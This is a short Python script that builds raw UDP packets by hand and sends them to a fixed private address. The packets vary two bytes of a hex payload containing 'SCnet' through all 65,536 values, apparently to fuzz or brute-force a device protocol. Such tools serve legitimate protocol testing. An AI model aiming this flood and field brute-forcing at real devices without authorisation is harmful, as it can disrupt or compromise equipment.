import socket
import struct
import binascii
SOURCE_IP = "172.21.0.254"
SOURCE_PORT =12544
DST_IP = "172.21.0.2"
DST_PORT = 12288

def Checksum(data):
    if len(data)%2 != 0:
        data = data + struct.pack("!B",0)
    s = 0
    for i in range(0,len(data),2):
        w = ord(data[i])+(ord(data[i+1]) << 8 )
        s  = s+w

    s = (s >> 16) + (s & 0xffff);
    s = s + (s >> 16);

    # complement and mask to 4 byte short
    s = ~s & 0xffff

    return s

def udp_send(data):
    data = binascii.a2b_hex(data)
    #Generate pseudo header
    srcip = socket.inet_aton(SOURCE_IP)
    dstip = socket.inet_aton(DST_IP)
    src_ip = struct.pack('!4s', srcip)
    dest_ip = struct.pack('!4s', dstip)

    zero = 0
    protocol = 17
    #protocol = socket.IPPROTO_UDP

    src_port = SOURCE_PORT
    dest_port = DST_PORT

    data_len = len(data)

    udp_length = 8 + data_len

    checksum = 0
    pseudo_header = struct.pack('!BBH', zero, protocol, udp_length)
    pseudo_header = src_ip + dest_ip + pseudo_header
    udp_header = struct.pack('!4H', src_port, dest_port, udp_length, checksum)
    checksum = Checksum(pseudo_header + udp_header + data)
    udp_header = struct.pack('!4H', src_port, dest_port, udp_length, checksum)
    s=socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP) 
    s.sendto(udp_header + data, (DST_IP,DST_PORT))

if __name__ =="__main__":
    data = "014700000608000000000000020018000021060025000021070053436e6574000100"
    for i in range(0,256):
        result = str(hex(i))
        if len(result) ==3:
            result = result[0:2]+'0'+result[2]
        result = result[2:]
        for j in range(0,256):
            result1 = str(hex(j))
            if len(result1)==3:
                result1 = result1[0:2]+'0'+result1[2]
            result1 = result1[2:]
            data = data[0:8]+result+result1+data[12:]
            #print(data)
            udp_send(data)
        
    #udp_send("014700000608000000000000020018000021060025000021070053436e6574000100")
